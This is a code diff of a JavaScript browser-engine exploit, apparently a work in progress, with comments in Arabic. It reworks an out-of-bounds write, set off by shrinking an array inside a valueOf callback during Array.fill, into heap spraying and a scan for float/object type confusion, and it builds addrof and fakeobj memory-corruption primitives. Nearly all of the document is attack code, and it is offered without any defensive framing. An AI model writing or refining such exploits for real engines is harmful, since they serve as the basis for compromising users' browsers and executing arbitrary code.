@@ -1,123 +1,137 @@
 import { log, sleep } from './module/utils.mjs';
 
-class AddrofFakeobjExploit {
+class MassOOBExploit {
     constructor() {
-        this.float_buf = null;
-        this.obj_buf = null;
-        this.float_view = null;
-        this.obj_view = null;
+        this.marker = 0x42424242;
+        this.found = false;
     }
 
     async execute() {
-        // استخدم TypedArrays للتحكم الدقيق في الذاكرة
-        await this.setupTypedArrays();
-        return await this.corruptAndTest();
+        await this.massOOBSpray();
+        return await this.findRealOverlap();
     }
 
-    async setupTypedArrays() {
-        // إنشاء ArrayBuffers كبيرة والتحكم فيها عبر TypedArrays
-        this.float_buf = new ArrayBuffer(0x1000);
-        this.obj_buf = new ArrayBuffer(0x1000);
+    async massOOBSpray() {
+        log("Starting massive OOB spraying...");
         
-        this.float_view = new Float64Array(this.float_buf);
-        this.obj_view = new Uint32Array(this.obj_buf);
+        for (let round = 0; round < 10; round++) {
+            log(`OOB round ${round}`);
+            
+            // كل جولة: spray ثم OOB-write
+            await this.sprayArrays(round);
+            await this.multipleOOBWrites(round);
+            await sleep(20);
+            
+            if (this.found) break;
+        }
+    }
+
+    async sprayArrays(round) {
+        this.arrays = [];
         
-        // ملء البيانات
-        for (let i = 0; i < this.float_view.length; i++) {
-            this.float_view[i] = i + 0.1;
+        // spray مصفوفات floats و objects معاً
+        for (let i = 0; i < 200; i++) {
+            // مجموعة floats
+            const floats = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7];
+            floats.original_length = floats.length;
+            floats.type = "float";
+            floats.id = `f_${round}_${i}`;
+            
+            // مجموعة objects  
+            const objects = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}];
+            objects.original_length = objects.length;
+            objects.type = "obj";
+            objects.id = `o_${round}_${i}`;
+            
+            this.arrays.push(floats, objects);
         }
         
-        log("TypedArrays setup complete");
+        log(`Sprayed ${this.arrays.length} arrays`);
     }
 
-    async corruptAndTest() {
-        // استخدام OOB-write لخلق التداخل
-        await this.createMemoryOverlap();
+    async multipleOOBWrites(round) {
+        // OOB-writes متعددة بأحجام مختلفة
+        const sizes = [50000, 100000, 200000, 500000];
         
-        // اختبار مباشر على الذاكرة الخام
-        return this.testRawMemoryAccess();
-    }
-
-    async createMemoryOverlap() {
-        const spray = [];
-        
-        // إنشاء العديد من الكائنات بالقرب من بعضها
-        for (let i = 0; i < 500; i++) {
-            const obj = {
-                id: i,
-                marker: 0x42424242,
-                data: new ArrayBuffer(64)
-            };
-            spray.push(obj);
+        for (const size of sizes) {
+            await this.singleOOBWrite(size, round);
+            await sleep(5);
         }
-
-        // Trigger OOB-write كبير
-        await this.massiveOOB();
-        await sleep(100);
-        
-        this.spray = spray;
     }
 
-    async massiveOOB() {
-        const arrays = [];
-        
-        // إنشاء مصفوفات كبيرة
-        for (let i = 0; i < 1000; i++) {
-            const arr = new Array(1000);
-            for (let j = 0; j < arr.length; j++) {
-                arr[j] = {
-                    index: i,
-                    position: j,
-                    value: j * 0.1
-                };
-            }
-            arrays.push(arr);
-        }
-
-        // OOB-write قوي
+    async singleOOBWrite(size, round) {
         const v0 = [];
-        for (let i = 0; i < 100000; i++) {
+        
+        // ملء المصفوفة بكائنات معقدة
+        for (let i = 0; i < size; i++) {
             v0[i] = {
-                target: "corruption",
-                buf: new ArrayBuffer(128),
-                arr: arrays[i % arrays.length]
+                round: round,
+                index: i,
+                float_data: [i * 0.1, i * 0.2, i * 0.3],
+                obj_data: {x: i, y: i * 2},
+                buffer: new ArrayBuffer(32 + (i % 16))
             };
         }
         
-        const v10 = {exploit: true};
+        const v10 = {
+            oob_marker: this.marker,
+            round: round,
+            payload: new ArrayBuffer(64)
+        };
         
         let shrunk = false;
         const o14 = {
             valueOf: () => {
                 if (!shrunk) {
-                    v0.length = 1000; // تقليص كبير
+                    // تقليصات مختلفة في كل مرة
+                    const shrink_to = [100, 500, 1000, 5000][round % 4];
+                    v0.length = shrink_to;
                     shrunk = true;
+                    log(`Shrunk to ${shrink_to}`);
                 }
-                return 0;
+                return [0, 1, 2, 3, 4, 5][round % 6]; // startIndex مختلف
             }
         };
         
-        v0.fill(v10, o14);
+        try {
+            v0.fill(v10, o14);
+        } catch (e) {}
+        
+        // احتفظ بمرجع لمنع الـ GC
+        this[`v0_${round}_${size}`] = v0;
     }
 
-    testRawMemoryAccess() {
-        // بدلاً من الاعتماد على مصفوفات متداخلة،
-        // استخدم OOB للوصول المباشر للكائنات
+    async findRealOverlap() {
+        log("Scanning for real memory overlap...");
         
-        for (let i = 0; i < this.spray.length; i++) {
-            const obj = this.spray[i];
+        for (let i = 0; i < this.arrays.length; i++) {
+            const arr = this.arrays[i];
             
-            // حاول الوصول للكائن عبر OOB في المصفوفات الأخرى
-            for (let j = 0; j < 100; j++) {
-                const testArr = new Array(100);
-                
-                // إذا كان هذا المصفوفة متضررة، قد نرى الكائن
-                for (let k = testArr.length; k < testArr.length + 50; k++) {
-                    if (testArr[k] === obj) {
-                        log(`Found object ${i} via OOB at index ${k}`);
-                        this.found_obj = obj;
-                        this.found_idx = k;
-                        this.test_arr = testArr;
+            if (arr.type === "float") {
+                // ابحث عن objects عبر OOB في float arrays
+                for (let j = arr.original_length; j < arr.original_length + 100; j++) {
+                    if (arr[j] !== undefined && typeof arr[j] === 'object') {
+                        if (arr[j].a !== undefined || arr[j].b !== undefined) {
+                            log(`FOUND! Float array has object at index ${j}`);
+                            this.float_arr = arr;
+                            this.obj_in_float = arr[j];
+                            this.obj_index = j;
+                            this.found = true;
+                            return true;
+                        }
+                    }
+                }
+            }
+            
+            if (arr.type === "obj") {
+                // ابحث عن floats عبر OOB في object arrays
+                for (let j = arr.original_length; j < arr.original_length + 100; j++) {
+                    if (typeof arr[j] === 'number' && arr[j] > 1.0 && arr[j] < 10.0) {
+                        log(`FOUND! Object array has float at index ${j}: ${arr[j]}`);
+                        this.obj_arr = arr;
+                        this.float_in_obj = arr[j];
+                        this.float_index = j;
+                        this.found = true;
                         return true;
                     }
                 }
@@ -127,42 +141,51 @@ class AddrofFakeobjExploit {
         return false;
     }
 
-    // primitive بديل باستخدام OOB مباشرة
+    // الـ primitives الحقيقية
     addrof(obj) {
-        if (!this.test_arr) return null;
+        if (!this.obj_arr || !this.float_index) return null;
         
-        // ابحث عن الكائن عبر OOB
-        for (let i = this.test_arr.length; i < this.test_arr.length + 100; i++) {
-            if (this.test_arr[i] === obj) {
-                log(`Object found at OOB index: ${i}`);
-                return i; // مؤقتاً - هذا ليس العنوان الحقيقي
-            }
-        }
-        return null;
+        // ضع الكائن في object array
+        this.obj_arr[0] = obj;
+        
+        // اقرأ من float array في الموضع المتداخل
+        return this.float_arr[this.float_index];
     }
 
-    fakeobj(idx) {
-        if (!this.test_arr || !this.found_idx) return null;
-        return this.test_arr[idx];
+    fakeobj(addr) {
+        if (!this.float_arr || !this.obj_index) return null;
+        
+        // اكتب العنوان في float array
+        this.float_arr[this.obj_index] = addr;
+        
+        // اقرأ من object array في الموضع المتداخل
+        return this.obj_arr[0];
     }
 }
 
-// اختبار بسيط
+// التشغيل
 async function main() {
-    const exploit = new AddrofFakeobjExploit();
+    const exploit = new MassOOBExploit();
     const success = await exploit.execute();
     
-    if (success && exploit.found_obj) {
-        log("Memory corruption successful!");
+    if (success) {
+        log("SUCCESS: Real memory overlap found!");
         
-        const testObj = {test: "object", value: 123};
+        // اختبار الـ primitives
+        const testObj = {secret: 0x1337, data: "test"};
         
-        // ابحث عن الكائن الجديد
-        const location = exploit.addrof(testObj);
-        log(`Object location: ${location}`);
+        log("Testing addrof...");
+        const addr = exploit.addrof(testObj);
+        log(`Address: ${addr} (type: ${typeof addr})`);
+        
+        if (addr && typeof addr === 'number' && addr > 1000) {
+            log("Testing fakeobj...");
+            const fake = exploit.fakeobj(addr);
+            log(`Fake object matches: ${fake === testObj}`);
+        }
         
     } else {
-        log("Need different approach - التداخل الحقيقي لم يحدث");
+        log("No overlap found -可能需要 جولات أكثر أو إعداد مختلف");
     }
 }
 
